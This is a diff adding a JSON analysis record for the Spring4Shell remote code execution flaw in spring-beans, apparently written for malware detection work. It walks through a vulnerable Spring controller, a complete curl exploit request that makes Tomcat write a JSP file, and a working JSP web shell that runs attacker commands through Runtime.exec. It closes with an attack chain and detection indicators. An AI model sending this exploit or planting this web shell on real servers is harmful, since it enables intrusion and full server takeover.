@@ -1,0 +1,149 @@
+{
+  "package_info": {
+    "package_name": "spring-beans",
+    "package_manager": "Maven (Java)",
+    "package_versions": "< 5.3.18, < 5.2.20",
+    "why_malicious": "The affected versions of the spring-beans package contain a critical remote code execution (RCE) vulnerability (Spring4Shell) that allows attackers to manipulate class properties via crafted HTTP requests, leading to arbitrary file creation and code execution on the server. This makes the package dangerous in production environments, as it enables attackers to gain unauthorized access and control."
+  },
+  "malicious_snippets": [
+    {
+      "snippet_id": "snippet_1",
+      "execution_context": {
+        "trigger": "runtime (HTTP POST request to controller endpoint)",
+        "file_location": "GreetingController.java (Spring MVC controller with @PostMapping)",
+        "required_permissions": [
+          "network",
+          "filesystem"
+        ]
+      },
+      "code_snippet": "@PostMapping(\"/greeting\")\npublic String greetingSubmit(@ModelAttribute Greeting greeting, Model model) {\n   model.addAttribute(\"greeting\", greeting);\n   return \"result\";\n}",
+      "code_language": "java",
+      "code_behavior": "At runtime, the controller method binds HTTP POST parameters to a POJO using Spring's data binding, allowing attacker-supplied parameters to set arbitrary class properties, which can be abused to manipulate internal server objects and trigger file creation or code execution.",
+      "malice_analysis": {
+        "why_suspicious": "The data binding process is overly permissive, allowing external input to set sensitive internal properties, which can be leveraged for remote code execution.",
+        "violated_expectations": "Normally, data binding should only set safe, explicitly allowed fields. Here, it allows manipulation of internal classloader and pipeline properties.",
+        "similar_legitimate_use": "Legitimate use would be binding form data to a POJO for business logic, not for manipulating server internals.",
+        "key_indicators": [
+          "Binding of attacker-controlled parameters to internal server properties",
+          "Lack of field restriction or allowlist"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_2",
+      "execution_context": {
+        "trigger": "runtime (malicious HTTP POST request)",
+        "file_location": "HTTP request to vulnerable controller endpoint",
+        "required_permissions": [
+          "network",
+          "filesystem"
+        ]
+      },
+      "code_snippet": "curl -X POST \\\n -H \"pre:<%\" \\\n -H \"post:;%>\" \\\n -F 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{pre}i out.println(\"HACKED\" + (2 + 5))%{post}i' \\\n -F 'class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp' \\\n -F 'class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/myapp' \\\n -F 'class.module.classLoader.resources.context.parent.pipeline.first.prefix=rce' \\\n -F 'class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=' \\\n http://mydomain/myapp/greeting",
+      "code_language": "shell (curl HTTP request)",
+      "code_behavior": "At runtime, a crafted HTTP POST request sets internal Tomcat logging pipeline properties via data binding, causing the server to write a JSP file containing attacker-controlled code to the webroot, resulting in arbitrary code execution when the file is accessed.",
+      "malice_analysis": {
+        "why_suspicious": "The request manipulates internal server configuration via HTTP parameters, resulting in the creation of executable files on the server.",
+        "violated_expectations": "Normal HTTP requests should not be able to alter server configuration or create files in the webroot.",
+        "similar_legitimate_use": "No legitimate use case for setting these internal properties via user input.",
+        "key_indicators": [
+          "Setting of class.module.classLoader.resources.context.parent.pipeline.first.* properties",
+          "Creation of .jsp files in webroot via HTTP request"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_3",
+      "execution_context": {
+        "trigger": "runtime (when attacker accesses the malicious JSP file)",
+        "file_location": "webapps/myapp/rce.jsp (created by exploit)",
+        "required_permissions": [
+          "filesystem",
+          "network (if web shell is used for outbound connections)"
+        ]
+      },
+      "code_snippet": "<% out.println(\"HACKED\"); %>",
+      "code_language": "jsp",
+      "code_behavior": "At runtime, when the attacker accesses the malicious JSP file, the server executes arbitrary code embedded in the file, such as printing output or running system commands, enabling remote code execution.",
+      "malice_analysis": {
+        "why_suspicious": "The presence of attacker-controlled JSP files in the webroot is a clear indicator of exploitation and allows arbitrary code execution.",
+        "violated_expectations": "Webroot should not contain files created by user input, especially executable code.",
+        "similar_legitimate_use": "JSP files are legitimate for server-side logic, but not when created via user input.",
+        "key_indicators": [
+          "JSP file with attacker-controlled code in webroot",
+          "Ability to execute arbitrary code via web requests"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_4",
+      "execution_context": {
+        "trigger": "runtime (when attacker accesses web shell with command parameters)",
+        "file_location": "webapps/myapp/tomcatwar.jsp (created by exploit)",
+        "required_permissions": [
+          "filesystem",
+          "network",
+          "environment_vars"
+        ]
+      },
+      "code_snippet": "<% if (request.getParameter(\"pwd\").equals(\"j\")) { out.println(Runtime.getRuntime().exec(request.getParameter(\"cmd\"))); } %>",
+      "code_language": "jsp",
+      "code_behavior": "At runtime, when the attacker accesses the web shell JSP file with specific parameters, the server executes arbitrary system commands provided by the attacker, returning the output in the HTTP response.",
+      "malice_analysis": {
+        "why_suspicious": "This code provides a backdoor for arbitrary command execution via HTTP requests, a classic web shell pattern.",
+        "violated_expectations": "Application code should never allow user-supplied input to be executed as system commands.",
+        "similar_legitimate_use": "No legitimate use case for this pattern in production code.",
+        "key_indicators": [
+          "Use of Runtime.getRuntime().exec with user input",
+          "Conditional execution based on request parameters"
+        ]
+      }
+    }
+  ],
+  "attack_chain": [
+    {
+      "step": 1,
+      "action": "Attacker sends a crafted HTTP POST request to the vulnerable controller endpoint, exploiting data binding to set internal server properties.",
+      "implemented_by": [
+        "snippet_1",
+        "snippet_2"
+      ],
+      "leads_to": "Creation of a malicious JSP file in the webroot."
+    },
+    {
+      "step": 2,
+      "action": "Server writes attacker-controlled JSP file (web shell) to the webroot directory.",
+      "implemented_by": [
+        "snippet_2"
+      ],
+      "leads_to": "Attacker can access the JSP file via HTTP."
+    },
+    {
+      "step": 3,
+      "action": "Attacker accesses the malicious JSP file, triggering execution of arbitrary code or system commands on the server.",
+      "implemented_by": [
+        "snippet_3",
+        "snippet_4"
+      ],
+      "leads_to": "Remote code execution and potential full server compromise."
+    }
+  ],
+  "detection_knowledge": {
+    "behavioral_signatures": [
+      "HTTP POST requests with parameters targeting internal classloader or pipeline properties",
+      "Unexpected creation of .jsp files in webroot directories",
+      "Execution of new JSP files shortly after suspicious HTTP requests",
+      "JSP files containing code that executes system commands based on request parameters"
+    ],
+    "file_indicators": [
+      "webapps/*/rce.jsp",
+      "webapps/*/tomcatwar.jsp",
+      "Any new .jsp files in webroot not present in source code"
+    ],
+    "network_indicators": [
+      "Unusual HTTP POST requests with parameters like class.module.classLoader.resources.context.parent.pipeline.first.*",
+      "Subsequent HTTP GET/POST requests to newly created .jsp files"
+    ],
+    "how_to_detect": "Monitor for HTTP requests that set internal Java/Tomcat properties via parameter names (e.g., class.module.classLoader.resources.context.parent.pipeline.first.pattern). Alert on creation of new .jsp files in webroot directories. Scan for JSP files containing code that executes system commands or prints output based on request parameters. Correlate suspicious HTTP requests with file creation and execution events."
+  }
+}
